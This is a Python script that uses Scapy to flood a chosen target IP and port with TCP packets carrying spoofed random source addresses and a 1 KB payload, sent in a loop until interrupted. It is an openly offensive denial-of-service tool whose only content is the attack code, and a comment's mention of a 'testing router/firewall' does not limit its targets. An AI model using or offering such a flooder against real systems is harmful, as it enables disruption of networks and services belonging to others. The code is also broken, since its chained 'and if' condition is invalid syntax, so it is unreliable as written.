from scapy.all import *
from argparse import ArgumentParser
import socket


def main():
    
    # Specify the command line Arguments
    parser = ArgumentParser()
    parser.add_argument('--target-ip', '-t', help='Target IP address')
    parser.add_argument('--target-port', '-p', help='Target Port')
    parser.add_argument('--tcp-flag', '-f', help='TCP Flag')
    parser.epilog = "Usage: python syn_flooding.py -t <IP Address>"        
    args = parser.parse_args()
    

    try:
        socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
        
    except:    
        parser.print_help()
        sys.exit(1)
    
    # Checks if argument is not empty
    if args.target_ip is not None and if args.target_port is not None and if args.tcp_flag is not None:
        target_ip = args.target_ip # target IP address (should be a testing router/firewall)

        target_port = int(args.target_port) # the target port u want to flood

        tcp_flag = args.tcp_flag # TCP Flag to flood

        ip = IP(src=RandIP(), dst=target_ip) # forge IP packet with source IP Spoofing and target ip as the destination IP address

        tcp = TCP(sport=RandShort(), dport=target_port, flags=tcp_flag) # random source port, use TCP SYN packet.

        raw = Raw(b"X"*1024) # add some flooding data (1KB in this case, don't increase it too much, # otherwise, it won't work.)

        p = ip / tcp / raw # stack up the layers

        send(p, count=1, verbose=0) # send 1 packet to test if target ip is valid

        print("The Flood has commence, do CTRL+C to cancel / exit")

        send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected

    else:
        parser.print_help()
        sys.exit(1)
        

main()
sys.exit(0)
